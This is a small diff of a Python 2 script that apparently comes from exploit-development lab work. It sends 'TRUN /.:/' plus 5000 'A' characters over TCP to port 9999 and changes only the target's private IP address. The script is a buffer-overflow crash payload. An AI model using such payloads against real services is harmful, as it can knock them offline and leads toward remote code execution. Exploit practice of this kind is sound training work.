@@ -21,7 +21,7 @@ buf = "TRUN /.:/"
 buf += "A" * 5000
 
 s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) ## Creating Socket, IPv4 TCP
-s.connect(("10.50.21.118", 9999)) ## Define host and port
+s.connect(("192.168.65.20", 9999)) ## Define host and port
 print s.recv(1024) ## Print to screen the response
 s.send(buf) ## Send variable buf
 print s.recv(1024) ## Print to screen the response
